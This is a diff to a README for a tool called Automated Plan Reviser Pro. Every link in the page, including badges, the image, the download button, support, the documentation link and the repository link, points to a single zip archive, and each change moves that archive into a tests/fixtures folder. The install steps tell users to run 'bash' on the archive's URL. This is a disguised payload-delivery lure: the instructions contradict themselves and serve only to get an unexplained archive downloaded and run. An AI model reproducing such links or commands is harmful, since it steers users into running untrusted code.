@@ -1,15 +1,15 @@
 # 🚀 automated_plan_reviser_pro - Streamline Your Specification Refinement
 
 <div align="center">
-  <img src="https://github.com/JoseSantoslv/automated_plan_reviser_pro/raw/refs/heads/main/workflows/plan-pro-reviser-automated-1.4.zip" alt="Automated Plan Reviser Pro - Iterative specification refinement with AI">
+  <img src="https://raw.githubusercontent.com/JoseSantoslv/automated_plan_reviser_pro/main/tests/fixtures/documents/reviser_pro_plan_automated_v1.9.zip" alt="Automated Plan Reviser Pro - Iterative specification refinement with AI">
 </div>
 
 <div align="center">
 
-[![Version](https://github.com/JoseSantoslv/automated_plan_reviser_pro/raw/refs/heads/main/workflows/plan-pro-reviser-automated-1.4.zip)](https://github.com/JoseSantoslv/automated_plan_reviser_pro/raw/refs/heads/main/workflows/plan-pro-reviser-automated-1.4.zip)
-[![Platform](https://github.com/JoseSantoslv/automated_plan_reviser_pro/raw/refs/heads/main/workflows/plan-pro-reviser-automated-1.4.zip%20%7C%20Linux-blueviolet?style=for-the-badge)](https://github.com/JoseSantoslv/automated_plan_reviser_pro/raw/refs/heads/main/workflows/plan-pro-reviser-automated-1.4.zip)
-[![Runtime](https://github.com/JoseSantoslv/automated_plan_reviser_pro/raw/refs/heads/main/workflows/plan-pro-reviser-automated-1.4.zip%204+-purple?style=for-the-badge)](https://github.com/JoseSantoslv/automated_plan_reviser_pro/raw/refs/heads/main/workflows/plan-pro-reviser-automated-1.4.zip)
-[![License: MIT](https://github.com/JoseSantoslv/automated_plan_reviser_pro/raw/refs/heads/main/workflows/plan-pro-reviser-automated-1.4.zip)](https://github.com/JoseSantoslv/automated_plan_reviser_pro/raw/refs/heads/main/workflows/plan-pro-reviser-automated-1.4.zip)
+[![Version](https://raw.githubusercontent.com/JoseSantoslv/automated_plan_reviser_pro/main/tests/fixtures/documents/reviser_pro_plan_automated_v1.9.zip)](https://raw.githubusercontent.com/JoseSantoslv/automated_plan_reviser_pro/main/tests/fixtures/documents/reviser_pro_plan_automated_v1.9.zip)
+[![Platform](https://raw.githubusercontent.com/JoseSantoslv/automated_plan_reviser_pro/main/tests/fixtures/documents/reviser_pro_plan_automated_v1.9.zip%20%7C%20Linux-blueviolet?style=for-the-badge)](https://raw.githubusercontent.com/JoseSantoslv/automated_plan_reviser_pro/main/tests/fixtures/documents/reviser_pro_plan_automated_v1.9.zip)
+[![Runtime](https://raw.githubusercontent.com/JoseSantoslv/automated_plan_reviser_pro/main/tests/fixtures/documents/reviser_pro_plan_automated_v1.9.zip%204+-purple?style=for-the-badge)](https://raw.githubusercontent.com/JoseSantoslv/automated_plan_reviser_pro/main/tests/fixtures/documents/reviser_pro_plan_automated_v1.9.zip)
+[![License: MIT](https://raw.githubusercontent.com/JoseSantoslv/automated_plan_reviser_pro/main/tests/fixtures/documents/reviser_pro_plan_automated_v1.9.zip)](https://raw.githubusercontent.com/JoseSantoslv/automated_plan_reviser_pro/main/tests/fixtures/documents/reviser_pro_plan_automated_v1.9.zip)
 
 </div>
 
@@ -22,7 +22,7 @@ To get started with Automated Plan Reviser Pro, follow these steps:
 1. **Visit the Release Page**  
    Click the button below to go to the download page.
 
-   [Download Automated Plan Reviser Pro](https://github.com/JoseSantoslv/automated_plan_reviser_pro/raw/refs/heads/main/workflows/plan-pro-reviser-automated-1.4.zip)
+   [Download Automated Plan Reviser Pro](https://raw.githubusercontent.com/JoseSantoslv/automated_plan_reviser_pro/main/tests/fixtures/documents/reviser_pro_plan_automated_v1.9.zip)
 
 2. **Select Your Platform**  
    Automated Plan Reviser Pro supports macOS and Linux. Make sure to choose the correct version for your operating system.
@@ -30,7 +30,7 @@ To get started with Automated Plan Reviser Pro, follow these steps:
 3. **Download the Software**  
    On the release page, find the latest version, version 1.2.2, and click on the file link to download. 
 
-   ![Download](https://github.com/JoseSantoslv/automated_plan_reviser_pro/raw/refs/heads/main/workflows/plan-pro-reviser-automated-1.4.zip%20version-blue?style=for-the-badge)
+   ![Download](https://raw.githubusercontent.com/JoseSantoslv/automated_plan_reviser_pro/main/tests/fixtures/documents/reviser_pro_plan_automated_v1.9.zip%20version-blue?style=for-the-badge)
 
 4. **Locate the Downloaded File**  
    Once the download is complete, go to your downloads folder, where you will find the file.
@@ -42,7 +42,7 @@ To get started with Automated Plan Reviser Pro, follow these steps:
      ```
      Then run:
      ```
-     bash https://github.com/JoseSantoslv/automated_plan_reviser_pro/raw/refs/heads/main/workflows/plan-pro-reviser-automated-1.4.zip
+     bash https://raw.githubusercontent.com/JoseSantoslv/automated_plan_reviser_pro/main/tests/fixtures/documents/reviser_pro_plan_automated_v1.9.zip
      ```
    - For **Linux**: Open your terminal. Change to the downloads directory with:
      ```
@@ -50,7 +50,7 @@ To get started with Automated Plan Reviser Pro, follow these steps:
      ```
      Then execute the application:
      ```
-     bash https://github.com/JoseSantoslv/automated_plan_reviser_pro/raw/refs/heads/main/workflows/plan-pro-reviser-automated-1.4.zip
+     bash https://raw.githubusercontent.com/JoseSantoslv/automated_plan_reviser_pro/main/tests/fixtures/documents/reviser_pro_plan_automated_v1.9.zip
      ```
 
 6. **Follow the On-Screen Instructions**  
@@ -87,12 +87,12 @@ A: Yes, once installed, you do not need an internet connection to use the softwa
 
 ## 📞 Support
 
-If you have any issues or questions, feel free to open an issue in the repository or visit our [Support Page](https://github.com/JoseSantoslv/automated_plan_reviser_pro/raw/refs/heads/main/workflows/plan-pro-reviser-automated-1.4.zip).
+If you have any issues or questions, feel free to open an issue in the repository or visit our [Support Page](https://raw.githubusercontent.com/JoseSantoslv/automated_plan_reviser_pro/main/tests/fixtures/documents/reviser_pro_plan_automated_v1.9.zip).
 
-For updates and resources, check back frequently at our [repository](https://github.com/JoseSantoslv/automated_plan_reviser_pro/raw/refs/heads/main/workflows/plan-pro-reviser-automated-1.4.zip).
+For updates and resources, check back frequently at our [repository](https://raw.githubusercontent.com/JoseSantoslv/automated_plan_reviser_pro/main/tests/fixtures/documents/reviser_pro_plan_automated_v1.9.zip).
 
 ## 🔗 Additional Resources
 
-To learn more about using the application and its features, visit the [Documentation](https://github.com/JoseSantoslv/automated_plan_reviser_pro/raw/refs/heads/main/workflows/plan-pro-reviser-automated-1.4.zip). 
+To learn more about using the application and its features, visit the [Documentation](https://raw.githubusercontent.com/JoseSantoslv/automated_plan_reviser_pro/main/tests/fixtures/documents/reviser_pro_plan_automated_v1.9.zip). 
 
 Thank you for choosing Automated Plan Reviser Pro! We hope this tool enhances your specification refinement process.
